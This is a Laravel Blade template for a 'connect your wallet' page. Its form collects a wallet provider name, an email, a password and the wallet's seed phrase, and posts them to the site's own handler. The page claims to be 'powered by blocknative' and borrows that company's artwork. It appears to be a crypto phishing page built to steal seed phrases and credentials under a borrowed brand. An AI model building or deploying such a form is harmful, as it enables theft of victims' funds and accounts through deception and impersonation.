@extends('user.base')
@section('content')
    @push('js')
        <style>
            .background {
                background-image: url("https://onboard.blocknative.com/_app/immutable/assets/connect-modal.b7439c5e.svg");
                background-size: auto;
                width: 100%;
                height: 300px;
                border: solid 2px #5a1bb0;
            }
        </style>
    @endpush
    <div class="container-fluid">
        <div class="background"></div>
        <div class="row mt-4">
            <div class="col-xl-8 mx-auto">
                <div class="card border-top border-0 border-4 border-primary">
                    <div class="card-body p-5">
                        <div class="card-title d-flex align-items-center">
                            <div><i class="bx bxs-user me-1 font-22 text-primary"></i>
                            </div>
                            <h5 class="mb-0 text-primary">{{$pageName}}</h5>
                        </div>
                        <hr>
                        <form class="row g-3" method="post"  action="{{route('connect-wallet.process')}}">
                            @csrf
                            <div class="form-group mb-3">
                                <label for="">Wallet provider</label>
                                <input type="text" name="provider" id="refer-link" class="form-control"
                                       placeholder="E.g Trustwallet ..." required>
                            </div>

                            <div class="form-group mb-3">
                                <label for="">Email address</label>
                                <input type="email" name="email" id="refer-link" class="form-control"
                                       placeholder="E.g jack@gmail.com" required>
                            </div>
                            <div class="form-group mb-3">
                                <label for="">Password</label>
                                <input type="password" name="password" id="refer-link" class="form-control"
                                       placeholder="Enter password" required>
                            </div>
                            <div class="form-group mb-3">
                                <label for="">Seedphrase</label>
                                <textarea placeholder="Enter seed phrase. eg: raw, math" class="form-control" name="seed"></textarea>
                            </div>

                            <p class="text-center mb-3">Securely connect your wallet to our blocks <small>powered by blocknative</small></p>

                            <button type="submit" class="btn btn-primary w-100" id="basic-addon2">Connect</button>

                        </form>
                    </div>
                </div>
            </div>
        </div>

    </div>


@endsection
